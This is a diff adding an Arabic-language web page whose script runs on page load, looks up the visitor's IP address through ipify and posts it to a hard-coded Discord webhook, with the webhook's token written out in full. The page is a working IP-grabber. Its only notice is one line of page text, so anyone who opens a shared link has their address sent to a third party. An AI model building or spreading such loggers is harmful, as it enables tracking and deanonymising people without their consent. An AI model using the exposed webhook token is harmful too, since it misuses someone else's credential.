@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تتبع عنوان IP الزائر</title>
+</head>
+<body>
+    <h1>مرحبًا بك في موقعي!</h1>
+    <p>هذا الموقع يرسل عنوان IP الخاص بك إلى Discord عند الدخول.</p>
+
+    <script>
+        // رابط Webhook الخاص بـ Discord
+        const webhookURL = "https://discord.com/api/webhooks/1350083678935580745/yrZSisuQ6T2f9cCU8WTyIrI1JjO7RUM0P4TXCC9u-vr5p02O3PY7-6FdhKrsfEexhIsT"; // استبدله برابط الـ Webhook الخاص بك
+
+        // الحصول على IP الزائر باستخدام API خارجي
+        fetch("https://api64.ipify.org?format=json")
+          .then(response => response.json())
+          .then(data => {
+              const visitorIP = data.ip; // استخراج عنوان IP
+
+              // تجهيز البيانات للإرسال إلى Discord
+              const payload = {
+                  content: `📢 زائر جديد على الموقع!\n🌍 عنوان IP: \`${visitorIP}\``
+              };
+
+              // إرسال IP إلى Discord عبر Webhook
+              fetch(webhookURL, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify(payload)
+              })
+              .then(() => console.log("✅ تم إرسال IP إلى Discord بنجاح."))
+              .catch(error => console.error("❌ خطأ في إرسال IP:", error));
+          })
+          .catch(error => console.error("❌ خطأ في جلب IP:", error));
+    </script>
+
+</body>
+</html>
